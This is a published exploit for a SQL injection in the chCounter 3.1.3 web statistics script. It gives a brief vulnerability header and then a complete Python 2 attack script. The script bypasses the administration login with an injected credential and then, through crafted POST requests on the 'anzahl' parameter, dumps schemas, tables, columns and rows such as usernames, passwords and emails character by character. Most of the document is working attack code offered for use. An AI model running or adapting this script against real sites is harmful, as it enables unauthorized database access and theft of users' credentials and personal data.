chCounter <= 3.1.3 SQL Injection Vulnerability
==============================================

#!/usr/bin/python
#
# Exploit Title: chCounter <= 3.1.3 SQLInjection
# Date: 2010/11/18
# Author: Matias Fontanini(mfontanini@cert.unlp.edu.ar).
# Software Link: http://chcounter.org/chCounter3/getfile.php?id=5
# Version: 3.1.3
# Tested on: Ubuntu Server 10.04 with apache
#
# Requirements:
# - Downloads must be enabled(this is not default).
# - magic_quotes off.
# - Access to administration site(can be bypassed if magic_quotes off)
#
# =SQLInjection=
# Location: administration/index.php?cat=downloads&edit=
# Affected parameters: anzahl
# Method: POST
# Severity: High
# Description: When accessing administration/index.php?cat=downloads&edit=VALID_ID
# and using a valid download id, an attacker is able to manipulate the "anzahl"
# parameter to perform queries which only involve returning an integer. The query
# output will be sent back to the client in the "anzahl" text input.
# Exploit: An attacker could perform repeated crafted requests to retrieve any
# database records for which the user has access.
 
import sys
import httplib, urllib
import types
 
lookupString=&#039;name="anzahl" value="&#039;
 
def generateHeaders(host, sessid):
    headers = {&#039;Host&#039;:host,
            &#039;User-Agent&#039;:&#039;Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.12) Gecko/20101027 Ubuntu/10.10 (maverick) Firefox/3.6.12&#039;,
            &#039;Accept&#039;:&#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;,
            &#039;Accept-Language&#039;:&#039;en-us,en;q=0.5&#039;,
            &#039;Accept-Encoding&#039;:&#039;deflate&#039;,
            &#039;Accept-Charset:&#039;:&#039;ISO-8859-1,utf-8;q=0.7,*;q=0.7&#039;,
            &#039;Keep-Alive&#039;:&#039;115&#039;,
            &#039;Connection&#039;:&#039;keep-alive&#039;,
            &#039;Content-Type&#039;:&#039;application/x-www-form-urlencoded&#039;,
            &#039;Referer&#039;:&#039;http://&#039; + host,
            &#039;Cookie&#039;:&#039;PHPSESSID=&#039;+sessid}
    if sessid == &#039;&#039;:
        del headers[&#039;Cookie&#039;]
    return headers
 
 
def loginRequest(connection, sessid, host, path):
    headers = generateHeaders(host, sessid)
    params = urllib.urlencode({&#039;login_form&#039;:&#039;1&#039;,&#039;login_name&#039;:&#039;or \&#039;=\&#039;&#039;,&#039;login_pw&#039;:&#039;&#039;})
    connection.request(&#039;POST&#039;, path + &#039;administration/index.php&#039;, params, headers)
    return connection.getresponse()
 
 
def generateSessId(connection, host, path):
    headers = generateHeaders(host, &#039;&#039;)
    connection.request(&#039;GET&#039;, path + &#039;stats/online_users.php&#039;, &#039;&#039;, headers)
    response = connection.getresponse()
    cookie = response.getheader(&#039;Set-Cookie&#039;)
    if type(cookie) is types.NoneType:
        print &#039;[-] Could not get session id. Wrong path?&#039;
        exit(2)
    return cookie[10:cookie.find(&#039;;&#039;)]
     
def genSessid(host, path):
    print &#039;[+] Trying &#039; + host + path
    con = connectToHost(host)
    sessid = generateSessId(con, host, path)
    print &#039;[+] Acquired PHPSESSID -> &#039; + sessid
    con = connectToHost(sys.argv[1])
    output = loginRequest(con, sessid, host, path).read()
    if output.find(&#039;login_name&#039;) != -1:
        print &#039;[-] Could not bypass login&#039;
        exit(7)
    return sessid
 
def guessLen(sessid, host, field, path, dId, table):
    headers = generateHeaders(host, sessid)
    connection = connectToHost(host)
    params = urllib.urlencode({&#039;dl_id&#039;:dId,
                               &#039;name&#039;:&#039;test&#039;,&#039;url&#039;:&#039;http://test.com&#039;,
                               &#039;wert&#039;:&#039;test&#039;,
                               &#039;timestamp_eintrag&#039;:&#039;2010-11-17, 15:43:00&#039;,
                               &#039;timestamp&#039;:&#039;2010-11-17, 15:43:00&#039;,
                               &#039;edit_download&#039;:&#039;Save entry&#039;,
                               &#039;anzahl&#039;:&#039;(select length(val) from (select &#039;+field+&#039; as val from &#039;+table+&#039;) as xYsdS)&#039;})
    connection.request(&#039;POST&#039;, path + &#039;administration/index.php?cat=downloads&edit=&#039;+str(dId), params, headers)
    response = connection.getresponse().read()
    if response.find(&#039;command denied&#039;) != -1:
        print &#039;[-] Could not acces table. Acces denied.&#039;
        exit(4)
    index = response.find(lookupString)
    return int(str(response[index+len(lookupString):response.find(&#039;"&#039;, index+len(lookupString))]))
 
 
def guessField(sessid, host, path, dId, field, table):
    sz=guessLen(sessid, host, field, path, dId, table)
    headers = generateHeaders(host, sessid)
    i=1
    while i <= sz:
        connection = connectToHost(host)
        params = urllib.urlencode({&#039;dl_id&#039;:dId,
                                   &#039;name&#039;:&#039;test&#039;,&#039;url&#039;:&#039;http://test.com&#039;,
                                   &#039;wert&#039;:&#039;test&#039;,
                                   &#039;timestamp_eintrag&#039;:&#039;2010-11-17, 15:43:00&#039;,
                                   &#039;timestamp&#039;:&#039;2010-11-17, 15:43:00&#039;,
                                   &#039;edit_download&#039;:&#039;Save entry&#039;,
                                   &#039;anzahl&#039;:&#039;(select ascii(substring(val,&#039;+str(i)+&#039;,1)) from (select &#039;+field+&#039; as val from &#039;+table+&#039;) as x)&#039;})
        connection.request(&#039;POST&#039;, path + &#039;administration/index.php?cat=downloads&edit=&#039;+str(dId), params, headers)
        response = connection.getresponse().read()
        index = response.find(lookupString)
        sys.stdout.write(chr(int(str(response[index+len(lookupString):response.find(&#039;"&#039;, index+len(lookupString))]))))
        sys.stdout.flush()
        i += 1
 
 
def getValidId(sessid, host, path):
    headers = generateHeaders(host, sessid)
    connection = connectToHost(host)
    connection.request(&#039;GET&#039;, path + &#039;administration/index.php?cat=downloads&#039;, &#039;&#039;, headers)
    response = connection.getresponse().read()
    if response.find(&#039;ID&#039;) == -1:
        print &#039;[-] Downloads seem to be deactivated&#039;
        exit(6)
    index=response.find(&#039;index.php?cat=downloads&edit=&#039;)
    return int(str(response[index+len(&#039;index.php?cat=downloads&edit=&#039;):response.find(&#039;"&#039;, index+len(&#039;index.php?cat=downloads&edit=&#039;))]))
 
def getRowCount(sessid, host, path, dId, field, table):
    headers = generateHeaders(host, sessid)
    connection = connectToHost(host)
    params = urllib.urlencode({&#039;dl_id&#039;:dId,
                               &#039;name&#039;:&#039;test&#039;,&#039;url&#039;:&#039;http://test.com&#039;,
                               &#039;wert&#039;:&#039;test&#039;,
                               &#039;timestamp_eintrag&#039;:&#039;2010-11-17, 15:43:00&#039;,
                               &#039;timestamp&#039;:&#039;2010-11-17, 15:43:00&#039;,
                               &#039;edit_download&#039;:&#039;Save entry&#039;,
                               &#039;anzahl&#039;:&#039;(select count(distinct(&#039;+field+&#039;)) from &#039;+table+&#039;)&#039;})
    connection.request(&#039;POST&#039;, path + &#039;administration/index.php?cat=downloads&edit=&#039;+str(dId), params, headers)
    response = connection.getresponse().read()
    if response.find(&#039;command denied&#039;) != -1:
        print &#039;[-] Could not acces table. Acces denied.&#039;
        exit(4)
    index = response.find(lookupString)
    return int(str(response[index+len(lookupString):response.find(&#039;"&#039;, index+len(lookupString))]))
 
def getSchemas(sessid, host, path, dId):   
    rows=getRowCount(sessid, host, path, dId,&#039;schema_name&#039;, &#039;information_schema.schemata&#039;)
    print &#039;[+] Schema count: &#039; + str(rows)
    for i in range(0, rows):
        sys.stdout.write(&#039;[+] Table name: &#039;)
        guessField(sessid, host, path, dId,&#039;schema_name&#039;, &#039;information_schema.schemata limit 1 offset &#039;+str(i))
        print &#039;&#039;
 
def getTables(sessid, host, path, dId):
    rows=getRowCount(sessid, host, path, dId,&#039;table_name&#039;, &#039;information_schema.tables&#039;)
    print &#039;[+] Table count: &#039; + str(rows)
    for i in range(0, rows):
        sys.stdout.write(&#039;[+] Table name: &#039;)
        guessField(sessid, host, path, dId,&#039;table_name&#039;, &#039;information_schema.tables limit 1 offset &#039;+str(i))
        print &#039;&#039;
 
 
def getColumns(sessid, host, path, dId, table):
    rows=getRowCount(sessid, host, path, dId,&#039;column_name&#039;, &#039;information_schema.columns where table_name = \&#039;&#039; + table + &#039;\&#039;&#039;)
    print &#039;[+] Column count: &#039; + str(rows)
    for i in range(0, rows):
        sys.stdout.write(&#039;[+] Column name: &#039;)
        guessField(sessid, host, path, dId,&#039;column_name&#039;, &#039;information_schema.columns where table_name = \&#039;&#039; + table + &#039;\&#039; limit 1 offset &#039;+str(i))
        print &#039;&#039;
 
def getItems(sessid, host, path, dId, table, columns, orderby):
    rows=getRowCount(sessid, host, path, dId, columns[0], table)
    print &#039;[+] Item count: &#039; + str(rows)
    print &#039;[+] Dump:&#039;
    for i in range(0, rows):
        for col in columns:
            if len(orderby):
                sys.stdout.write(&#039; || &#039;)
                guessField(sessid, host, path, dId, col, table+&#039; order by &#039; + orderby + &#039; limit 1 offset &#039;+str(i))
            else:
                sys.stdout.write(&#039; || &#039;)
                guessField(sessid, host, path, dId, col, table+&#039; limit 1 offset &#039;+str(i))
        print &#039; || &#039;
 
def connectToHost(host):
    con = httplib.HTTPConnection(sys.argv[1], 80)
    tries=5
    recon=True
    while tries > 0 and recon == True:
        try:
            con.connect();
            recon = False
        except:
            tries -= 1
    if tries == 0:
        print &#039;[-] Could not establish connection&#039;
        exit(3)
    return con
 
def printHelp():
    print &#039;[-] Usage &#039; + sys.argv[0] + &#039; <WEBSERVER> <PATH_TO_CHCOUNTER> <OPTION> [ARGS]&#039;
    print &#039;    OPTION can be:&#039;
    print &#039;                    -t to list all tables&#039;
    print &#039;                    -c <TABLE> to list all columns from table TABLE&#039;
    print &#039;                    -s <TABLE> to list all columns from table TABLE&#039;
    print &#039;                    -i <TABLE> <COLUMNS*> [ORDERBY] to list TABLE:COLUMN items.&#039;
    print &#039;                         COLUMNS* can be a comma-separated list of columns&#039;
    print &#039;&#039;
    print &#039;   Examples:&#039;
    print &#039;   &#039; + sys.argv[0] + &#039; www.vulnerable.com /chCounter/ -t&#039;
    print &#039;   &#039; + sys.argv[0] + &#039; www.vulnerable.com /chCounter/ -s&#039;
    print &#039;   &#039; + sys.argv[0] + &#039; www.vulnerable.com /chCounter/ -c users&#039;
    print &#039;   &#039; + sys.argv[0] + &#039; www.vulnerable.com /chCounter/ -i users username,passwd,email&#039;
    print &#039;   &#039; + sys.argv[0] + &#039; www.vulnerable.com /chCounter/ -i users username user_id&#039;
    print &#039;                       The last example outputs result ordered by user_id&#039;
    exit(1)
 
if len(sys.argv) < 4:
    printHelp()
 
sessid = genSessid(sys.argv[1], sys.argv[2])
valId = getValidId(sessid, sys.argv[1], sys.argv[2])
 
if sys.argv[3] == &#039;-t&#039;:
    getTables(sessid, sys.argv[1], sys.argv[2], valId)
    exit(0)
if sys.argv[3] == &#039;-c&#039;:
    if len(sys.argv) < 5:
        printHelp()
    getColumns(sessid, sys.argv[1], sys.argv[2], valId, sys.argv[4])
    exit(0)
if sys.argv[3] == &#039;-i&#039;:
    if len(sys.argv) < 6:
        printHelp()
    orderby=&#039;&#039;
    if len(sys.argv) == 7:
        orderby = sys.argv[6]
        orderby = sys.argv[6]
    getItems(sessid, sys.argv[1], sys.argv[2], valId, sys.argv[4], sys.argv[5].split(&#039;,&#039;), orderby)
    exit(0)
if sys.argv[3] == &#039;-s&#039;:
    if len(sys.argv) < 4:
        printHelp()
    getSchemas(sessid, sys.argv[1], sys.argv[2], valId)
    exit(0)



